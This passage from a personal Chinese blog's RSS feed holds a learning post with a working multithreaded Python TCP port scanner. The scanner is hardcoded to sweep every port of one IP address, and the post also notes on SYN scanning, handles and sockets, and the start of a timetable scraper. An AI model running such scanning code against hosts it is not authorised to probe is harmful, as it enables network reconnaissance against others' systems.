&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    b &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    c &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    transfer(a,c,b)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python端口扫描等</title>
        <link>https://proben1.github.io/2021/python%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AD%89/</link>
        <pubDate>Thu, 18 Nov 2021 22:13:33 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/python%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AD%89/</guid>
        <description>&lt;img src="https://pic.imgdb.cn/item/6240249d27f86abb2aa27d03.png" alt="Featured image of post Python端口扫描等" /&gt;&lt;h1 id=&#34;思路&#34;&gt;思路&lt;/h1&gt;
&lt;p&gt;这里使用了TCP连接扫描，利用操作系统原生的网络功能。&lt;/p&gt;
&lt;p&gt;用户无需特殊权限，但因为建立了TCP连接，很容易被发现，而且会留下IP地址。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;还有另外一种扫描方式是SYN扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送IP数据包，并监控其回应。这种扫描模式被称为“半开放扫描”，因为它从不建立完整的TCP连接。端口扫描工具生成一个SYN包，如果目标端口开放，则会返回SYN-ACK包。扫描端回应一个RST包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回RST包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但SYN扫描的优势是从不会建立完整的连接。然而，RST包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1.使用TCP握手连接来扫描指定的&lt;code&gt;(ip,port)&lt;/code&gt;对&lt;/p&gt;
&lt;p&gt;2.将单线程改成多线程&lt;/p&gt;
&lt;p&gt;3.第一次使用面向对象编程&lt;/p&gt;
&lt;h1 id=&#34;源码&#34;&gt;源码&lt;/h1&gt;
&lt;p&gt;说白了就是调接口，然后加了个多线程……&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; threading
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;82.157.174.226&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;post_list &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [i &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;65536&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;output &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;65536&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delay &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lock &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;Semaphore(&lt;span style=&#34;color:#bd93f9&#34;&gt;150&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;MyThread&lt;/span&gt;(threading&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;Thread):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; __init__(self, ip, port_number, output, delay):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;ip &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; ip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; port_number
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;output &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; output
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;delay &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; delay
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        threading&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;Thread&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;__init__(self)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;run&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; lock&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;acquire():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#6272a4&#34;&gt;#初始化socket,参数1是ipv4，参数2是TCP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            TCP_sock &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;AF_INET,socket&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#6272a4&#34;&gt;#设置参数，参数1表示我们正在使用的socket选项，参数2表示支持多个进程或者线程绑定到同一端口&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            TCP_sock&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;setsockopt(socket&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;SOL_SOCKET,socket&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;SO_REUSEADDR,&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#6272a4&#34;&gt;#设置超时等待时间，单位秒&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            TCP_sock&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;settimeout(self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;delay)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#6272a4&#34;&gt;# UDP_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#6272a4&#34;&gt;# UDP_sock.sendto(str(message), (ip, int(port_number)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                result &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; TCP_sock&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;connect_ex((ip, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number)))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; result &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    output[self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;OPEN&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number) &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; output[self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    output[self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;CLOSE&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    TCP_sock&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;error &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                output[self&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;port_number] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#6272a4&#34;&gt;#print(str(self.port_number) + &amp;#34;:&amp;#34; + output[self.port_number])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;pass&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            lock&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;release()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ThreadList &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; post_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    t &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; MyThread(ip, i, output, delay)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ThreadList&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;append(t)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; ThreadList:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    t&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;start()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; ThreadList:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    t&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; output:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; output[i] &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;CLOSE&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;PORT:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i) &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; output[i])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;其他&#34;&gt;其他&lt;/h1&gt;
&lt;h2 id=&#34;对handle的理解&#34;&gt;对handle的理解&lt;/h2&gt;
&lt;p&gt;首先在 PowerShell 中获取进程信息并以程序 ID 进行排序，第一列出现handles。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;PS &lt;/span&gt;C:\Users\Lenovo&amp;gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Get-Process&lt;/span&gt; | &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Sort-Object&lt;/span&gt; ID
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;SI &lt;/span&gt;ProcessName
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-------  ------    -----      -----     ------     --  -- -----------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      0       0       60          8                 0   0 Idle
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   8174       0       48        148                 4   0 System
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      0      16    14708      62260               160   0 Registry
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    430      17     4216      21944       2.11    480   1 RuntimeBroker
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     57       3     1068       1160               556   0 smss
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   2019      30    10004      24904               596   0 lsass
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    904      12     6616      10796               604   0 services
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    245      29    24792      11608               616   0 PresentationFont...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    154      10     1804       6648               848   0 svchost
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在代码里，handle 通常是某个数字标记，通过这个标记来操作资源。&lt;/p&gt;
&lt;p&gt;是否可以简单把Handles理解为Id？不好。
首先分配16位的标记，再用 8 位密码将 16 位标记加密，之后将 4 位类型、4 位权限、8 位密码、16 位加密结果打包成一个 32 位的整数，这时再简单理解的Handles为索引，就不恰当。&lt;/p&gt;
&lt;h2 id=&#34;对socket的理解&#34;&gt;对socket的理解&lt;/h2&gt;
&lt;p&gt;TCP/IP只是一个协议栈，如果想要有具体的应用，就需要提供对外的操作接口，就像操作系统会提供标准的编程接口，TCP/IP也必须对外提供编程接口，这就是Socket。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624022a427f86abb2a97fcf2.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624022a427f86abb2a97fcf2.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在我算明白了socket和http的区别：&lt;/p&gt;
&lt;p&gt;对概念来说：&lt;/p&gt;
&lt;p&gt;Http协议：基于TCP连接的简单的对象访问协议，对应于应用层。&lt;/p&gt;
&lt;p&gt;Socket是对TCP/IP协议的封装，Socket本身并不是协议，而是一个调用接口（API），通过Socket，我们才能使用TCP/IP协议。&lt;/p&gt;
&lt;p&gt;对一次连接过程而说：&lt;/p&gt;
&lt;p&gt;Http连接：所谓的无状态连接，客户端向服务器发送一次请求，服务器进行一次回应就断开。&lt;/p&gt;
&lt;p&gt;SOCKET连接：长连接，（如果期间没有数据的传输，会发送心跳包确认。）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>爬取xupt课程表</title>
        <link>https://proben1.github.io/2021/%E7%88%AC%E5%8F%96xupt%E8%AF%BE%E7%A8%8B%E8%A1%A8/</link>
        <pubDate>Mon, 15 Nov 2021 20:38:54 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E7%88%AC%E5%8F%96xupt%E8%AF%BE%E7%A8%8B%E8%A1%A8/</guid>
        <description>&lt;img src="https://pic.imgdb.cn/item/624023fa27f86abb2a9fb4a9.png" alt="Featured image of post 爬取xupt课程表" /&gt;&lt;p&gt;查课表，以前用的是超级课程表，嫌乎广告太多，加上手机内存不够，卸了，自己写个课表。&lt;/p&gt;
&lt;p&gt;由于学校教务系统的参数太多了，直接用了&lt;a class=&#34;link&#34; href=&#34;https://selenium-python-zh.readthedocs.io/en/latest/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;selenium&lt;/a&gt;来模拟登录，之后再用&lt;a class=&#34;link&#34; href=&#34;https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BeautifulSoup&lt;/a&gt;来分离参数。&lt;/p&gt;
&lt;p&gt;流程：查看本地json格式的课表文件，若没有则爬并存储，若有则直接读取并输出。&lt;/p&gt;
&lt;p&gt;做的时候发现单双周挺难弄的，最后是用了空间换时间的方法，把一个单双周合起来变成一个课表。&lt;/p&gt;
&lt;p&gt;最后用Power Automate 简单做了一个桌面流：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240231b27f86abb2a9acc7b.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240231b27f86abb2a9acc7b.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240232527f86abb2a9b0b0a.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240232527f86abb2a9b0b0a.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;附源代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; selenium &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; webdriver  &lt;span style=&#34;color:#6272a4&#34;&gt;# 启动浏览器需要用到&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; selenium.webdriver.common.keys &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; Keys  &lt;span style=&#34;color:#6272a4&#34;&gt;# 提供键盘按键支持（最后一个K要大写）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; bs4 &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; BeautifulSoup
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; json
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#输入账号密码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;student_id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;studend_password&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
